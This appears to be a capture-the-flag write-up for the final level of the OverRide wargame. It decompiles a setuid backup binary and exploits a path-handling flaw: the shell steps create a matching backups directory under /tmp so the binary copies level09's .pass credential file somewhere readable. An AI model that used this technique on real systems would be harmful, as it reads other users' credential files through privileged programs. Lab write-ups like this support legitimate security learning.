# Level 08

## Base analysis

```
level08@OverRide:~$ ls -l
-rwsr-s---+ 1 level09 users 12559 Sep 10  2016 level08
drwxrwx---+ ...                              backups
level08@OverRide:~$ checksec --file ./level08
RELRO         STACK CANARY     NX            PIE       FILE
Full RELRO    Canary found     NX disabled   No PIE    /home/users/level08/level08
```

Setuid `level09`. Full RELRO + canary make memory-corruption impractical — but this level doesn't need it. It's a **logic / path-traversal flaw**.

## Reverse engineering

`./level08 <filename>` backs up a file: it opens `<filename>` for reading, then copies its bytes into `./backups/<filename>`.

```c
__stream = fopen(av[1], "r");                    // opens YOUR argument, as level09
strncpy(local_78, "./backups/", 11);
strncat(local_78, av[1], 99 - strlen(local_78)); // dest = "./backups/" + av[1]
__fd = open(local_78, O_WRONLY|O_CREAT|..., 0660);
while ((c = fgetc(__stream)) != EOF)             // copy source -> dest
    write(__fd, &c, 1);
```

Because the binary is setuid `level09`, `fopen(av[1], "r")` reads the file **with level09's privileges** — including `/home/users/level09/.pass`. The only obstacle is where the copy lands: the destination is hardcoded as `./backups/` + our filename.

Try the obvious and it fails, because the destination directory doesn't exist:

```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The source opened fine (level09 can read it); only the destination `open` failed. We just need to make that destination path valid, in a directory we control.

## Exploitation

`/tmp` is world-writable, so we recreate the backup destination there and run the binary from `/tmp`:

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

The binary (as level09) reads the real `.pass` and writes it into `./backups/home/users/level09/.pass`, which now exists under `/tmp` — so we can read it.

Level 08, clear... You have finished OverRide!
